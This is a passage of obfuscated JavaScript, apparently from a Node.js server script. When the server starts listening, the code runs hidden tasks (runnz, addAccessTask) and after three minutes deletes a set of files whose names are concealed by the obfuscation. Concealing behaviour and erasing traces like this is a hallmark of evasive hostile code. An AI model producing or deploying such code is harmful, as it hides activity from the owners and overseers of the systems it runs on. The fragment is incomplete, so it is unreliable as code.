_0x26ce83={_0x3440cd:0x1fc,_0x2e55d4:0x237},_0x3f3e4f=_0x57ab16;[_0x3f3e4f(_0x26ce83._0x3440cd),_0x3f3e4f(0x242)][_0x3f3e4f(_0x26ce83._0x2e55d4)](_0x56aac5=>fs['unlink'](_0x56aac5,()=>{}));};httpServer[_0x57ab16(0x1da)](PORT,()=>{const _0x38f526={_0x1ca704:0x24c},_0x21c781=_0x57ab16;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x21c781(_0x38f526._0x1ca704)+PORT);});
